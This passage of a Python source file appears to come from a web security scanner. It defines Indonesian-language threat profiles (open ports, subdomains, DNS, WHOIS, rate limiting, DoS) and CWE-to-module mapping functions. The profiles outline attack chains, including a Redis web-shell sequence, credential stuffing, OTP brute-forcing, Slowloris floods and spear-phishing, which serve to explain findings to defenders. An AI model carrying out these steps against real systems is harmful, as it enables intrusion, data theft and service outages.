            "Sistem legacy yang lama tidak diupdate, server yang dideploy 'set "
            "and forget'."
        ),
        mitre_techniques=["T1592 (Gather Victim Host Information)", "T1190"],
        cwe_refs=["CWE-200"],
    ),

    "ports": ThreatProfile(
        title="Open Ports / Services",
        what_it_is=(
            "Selain port 80/443 yang publik, ada port lain yang terbuka ke internet "
            "(SSH 22, MySQL 3306, Redis 6379, Elasticsearch 9200, dll)."
        ),
        why_dangerous=(
            "Banyak service ini default tanpa authentication atau dengan credential "
            "default (Redis, MongoDB, Elasticsearch). Attacker langsung connect dan "
            "dump/modify data."
        ),
        attack_scenarios=[
            "Redis 6379 tanpa password → CONFIG SET dir /var/www → SET key 'shell.php' → SAVE → web shell.",
            "MongoDB 27017 tanpa auth → list semua database → dump koleksi user.",
            "Elasticsearch 9200 → akses /_search?size=10000 → seluruh log/data.",
            "MySQL 3306 dengan root:'' (kosong) → akses penuh DB.",
            "SSH 22 → bruteforce common credential, atau exploit kalau ada CVE OpenSSH.",
        ],
        attack_chain=[
            "1. nmap -sS -p- target → semua port.",
            "2. Service version detection (-sV).",
            "3. Untuk setiap service, test default credential.",
            "4. Eksploitasi service yang misconfig (no auth).",
            "5. Pivot dari service ke OS (Redis → web shell, SSH → kernel exploit).",
        ],
        real_world_impact=(
            "MongoDB 'apocalypse' 2017 — 25rb instance MongoDB tanpa auth "
            "dihapus + ransom by attacker. Indonesia: banyak instansi punya "
            "Elasticsearch/Redis terbuka, ditemukan via Shodan."
        ),
        who_is_at_risk=(
            "Cloud deployment yang tidak konfig firewall benar (security group AWS "
            "salah), instalasi quick-start yang bind 0.0.0.0 tanpa auth."
        ),
        mitre_techniques=["T1046 (Network Service Scanning)", "T1110 (Brute Force)", "T1078 (Valid Accounts)"],
        cwe_refs=["CWE-668", "CWE-200"],
    ),

    "subdomains": ThreatProfile(
        title="Subdomain Enumeration",
        what_it_is=(
            "Daftar subdomain target (api.target.com, dev.target.com, "
            "staging.target.com, admin.target.com)."
        ),
        why_dangerous=(
            "Sendiri tidak vulnerable, tapi memperluas attack surface 10-100x. "
            "dev/staging biasanya tidak di-harden seperti production: pakai cred "
            "default, log debug aktif, error verbose."
        ),
        attack_scenarios=[
            "Production hardened, tapi staging.target.com pakai password 'admin/admin' → masuk → akses DB yang share dengan production.",
            "old.target.com run aplikasi versi lama yang punya RCE — masuk via situ.",
            "internal.target.com expose API tanpa auth.",
            "Subdomain takeover: CNAME ke S3 bucket / Heroku app yang sudah dihapus → klaim ulang → host phishing dari domain trusted.",
        ],
        attack_chain=[
            "1. Subdomain enum (Sublist3r, amass, crt.sh).",
            "2. Untuk setiap subdomain: cek DNS, port scan, web fingerprint.",
            "3. Identifikasi subdomain yang lemah (versi lama, service tanpa auth).",
            "4. Eksploitasi titik terlemah → pivot ke aset utama.",
        ],
        real_world_impact=(
            "Uber 2017 — subdomain takeover di GitHub Pages dipakai untuk phishing. "
            "Banyak bug bounty dimulai dari subdomain abandoned."
        ),
        who_is_at_risk=(
            "Organisasi dengan banyak project lama / akuisisi yang DNS recordnya "
            "tidak rapih dibersihkan."
        ),
        mitre_techniques=["T1590 (Gather Victim Network Information)", "T1583.001 (Domains)"],
        cwe_refs=["CWE-200"],
    ),

    "dns": ThreatProfile(
        title="DNS Information",
        what_it_is="Record DNS publik (A, MX, NS, TXT, SPF, DMARC).",
        why_dangerous=(
            "Sendiri tidak vulnerable, tapi mengungkap infrastruktur (mail server, "
            "name server, cloud provider). SPF/DMARC yang lemah memungkinkan email "
            "spoofing."
        ),
        attack_scenarios=[
            "SPF: missing → attacker bisa spoof email dari @target.com (phishing).",
            "DMARC: p=none → email spoofing tidak ditolak, hanya dilaporkan.",
            "TXT: bocor service yang dipakai (verifikasi Google, Office365, Sendgrid) → attacker tahu mana phishing template yang efektif.",
            "MX → identify mail provider → social engineering staff IT.",
        ],
        attack_chain=[
            "1. dig target.com TXT, MX, NS, A.",
            "2. Test SPF: kirim test email pakai SPF record vs domain real.",
            "3. Buat phishing campaign dengan domain spoofed kalau SPF/DMARC lemah.",
        ],
        real_world_impact=(
            "Mayoritas BEC (Business Email Compromise) dimulai dari domain spoofing "
            "yang lewat karena SPF/DMARC tidak diset. FBI lapor BEC adalah scam #1 "
            "untuk korporat ($43M/tahun di USA)."
        ),
        who_is_at_risk=(
            "Setiap organisasi dengan email — terutama yang transaksi finansial via email."
        ),
        mitre_techniques=["T1566.001 (Spearphishing Attachment)", "T1590.002 (DNS)"],
        cwe_refs=["CWE-358"],
    ),

    "whois": ThreatProfile(
        title="WHOIS Information Disclosure",
        what_it_is=(
            "Data registrasi domain (nama owner, email, alamat, phone) yang public "
            "via WHOIS."
        ),
        why_dangerous=(
            "Bahan untuk social engineering: attacker tahu nama admin IT, email, "
            "tanggal expiry domain. Bisa target phishing atau pretend support."
        ),
        attack_scenarios=[
            "Spear phishing: email ke admin@target.com, dari ICANN palsu, 'domain hampir expired, klik untuk renew' → credential theft.",
            "Domain hijack: kalau registrar lemah + email admin compromised → ambil alih domain.",
            "Pretend support: 'Halo, dari registrar, butuh konfirmasi DNS update' via phone (sudah dapat phone dari WHOIS).",
        ],
        attack_chain=[
            "1. whois target.com.",
            "2. Catat nama, email, phone admin/billing.",
            "3. Recon LinkedIn untuk konfirmasi role.",
            "4. Eksekusi spear phishing dengan konteks personal.",
        ],
        real_world_impact=(
            "Banyak domain hijacking (termasuk media besar Indonesia) berawal dari "
            "spear phishing admin via info WHOIS. Solusi: pakai privacy proxy."
        ),
        who_is_at_risk="Domain yang tidak pakai WHOIS privacy / proxy.",
        mitre_techniques=["T1589 (Gather Victim Identity Information)", "T1566"],
        cwe_refs=["CWE-200"],
    ),

    # ---------- SIMULATE ----------
    "rate_limit": ThreatProfile(
        title="No Rate Limiting / Brute-force Possible",
        what_it_is=(
            "Endpoint login (atau OTP, password reset, API) menerima unlimited "
            "request tanpa throttling, lockout, atau CAPTCHA."
        ),
        why_dangerous=(
            "Attacker bisa bruteforce password, OTP (4-6 digit hanya 10rb-1jt "
            "kombinasi), atau enumerate user. Cred stuffing (pakai password "
            "leak dari site lain) sangat efektif."
        ),
        attack_scenarios=[
            "Cred stuffing: leak 100rb password dari site lain → coba semua di login → 1-3% biasanya match.",
            "OTP bruteforce: 6-digit OTP = 1 juta kombinasi, di rate 100/s = 3 jam selesai.",
            "Username enumeration: response berbeda untuk 'user not found' vs 'wrong password' → bangun list valid username.",
            "Password reset abuse: spam reset email ke ribuan user → DoS & customer support overload.",
        ],
        attack_chain=[
            "1. Identifikasi endpoint login / OTP / reset.",
            "2. Test apakah ada rate limit: kirim 100 request cepat, lihat respons.",
            "3. Kalau tidak ada limit, jalankan attack:",
            "   - Cred stuffing dengan tools seperti Hydra/SNIPR.",
            "   - OTP brute dengan iteration sederhana.",
            "4. Akun yang berhasil di-takeover → akses penuh.",
        ],
        real_world_impact=(
            "Disney+ 2019 — ribuan akun terjual di dark web hari pertama karena "
            "cred stuffing tanpa rate limit. Indonesia: tokopedia, gojek pernah "
            "kena cred stuffing massive."
        ),
        who_is_at_risk=(
            "Aplikasi tanpa Cloudflare/WAF, custom auth tanpa lockout policy, "
            "API tanpa quota."
        ),
        mitre_techniques=["T1110 (Brute Force)", "T1110.004 (Credential Stuffing)"],
        cwe_refs=["CWE-307", "CWE-799"],
    ),

    "burst": ThreatProfile(
        title="Burst / DoS Resilience",
        what_it_is=(
            "Server tidak punya proteksi terhadap burst request (mis. 1000 req/s "
            "dari satu IP)."
        ),
        why_dangerous=(
            "Application-layer DoS bisa down-kan service tanpa botnet besar. "
            "Slowloris, HTTP flood, GET bombing — semua jadi efektif."
        ),
        attack_scenarios=[
            "HTTP flood: 1000 req/s ke endpoint search yang hit DB → DB overload, site down.",
            "Slowloris: ribuan koneksi setengah-terbuka, exhaust thread pool.",
            "Resource exhaustion: upload file besar berulang.",
            "Bill shock: cloud-hosted app tanpa rate limit → autoscale → tagihan ribuan dollar dalam jam.",
        ],
        attack_chain=[
            "1. Identifikasi endpoint mahal (search, login, file generate).",
            "2. Pakai tool sederhana (hping3, slowhttptest) untuk burst.",
            "3. Monitor: response time naik, server crash, atau autoscale eksplosif.",
        ],
        real_world_impact=(
            "Banyak website e-commerce kecil/menengah di Indonesia kena 'serangan' "
            "kompetitor di event flash sale. Cloud bill shock sudah bikin beberapa "
            "startup tutup karena 1 hari ditembak."
        ),
        who_is_at_risk=(
            "Aplikasi tanpa Cloudflare/CDN, instance kecil tanpa autoscale guard, "
            "endpoint yang query mahal."
        ),
        mitre_techniques=["T1499 (Endpoint DoS)", "T1499.003 (Application Exhaustion)"],
        cwe_refs=["CWE-770", "CWE-400"],
    ),
}


# ---------------------------------------------------------------------------
# CWE-specific overrides — kalau finding punya CWE spesifik yang memberikan
# konteks lebih, kita pakai profile yang lebih precise.
# ---------------------------------------------------------------------------

_CWE_TO_MODULE: dict[str, str] = {
    "CWE-89":  "sqli",
    "CWE-79":  "xss",
    "CWE-80":  "xss",
    "CWE-22":  "lfi",
    "CWE-98":  "lfi",
    "CWE-77":  "cmdi",
    "CWE-78":  "cmdi",
    "CWE-601": "redirect",
    "CWE-548": "dirlist",
    "CWE-200": "fingerprint",  # generic info disclosure
    "CWE-538": "sensitive_files",
    "CWE-540": "sensitive_files",
    "CWE-614": "cookies",
    "CWE-1004": "cookies",
    "CWE-1275": "cookies",
    "CWE-942": "cors",
    "CWE-346": "cors",
    "CWE-1021": "clickjacking",
    "CWE-693": "headers",
    "CWE-326": "tls",
    "CWE-327": "tls",
    "CWE-295": "tls",
    "CWE-307": "rate_limit",
    "CWE-799": "rate_limit",
    "CWE-650": "methods",
}


def get_threat_profile(module: str, cwe: str | None = None) -> ThreatProfile | None:
    """Return the threat profile for a given module (or CWE override)."""
    # CWE-specific override punya prioritas
    if cwe and cwe in _CWE_TO_MODULE:
        mapped = _CWE_TO_MODULE[cwe]
        if mapped in _PROFILES:
            return _PROFILES[mapped]
    return _PROFILES.get(module)


def annotate_with_threat_intel(finding_dict: dict[str, Any]) -> dict[str, Any]:
    """Add `threat_intel` key to a finding dict in-place."""
    profile = get_threat_profile(
        finding_dict.get("module", ""),
        finding_dict.get("cwe"),
    )
    if profile is not None:
        finding_dict["threat_intel"] = profile.to_dict()
    return finding_dict


def list_supported_modules() -> list[str]:
    return sorted(_PROFILES.keys())
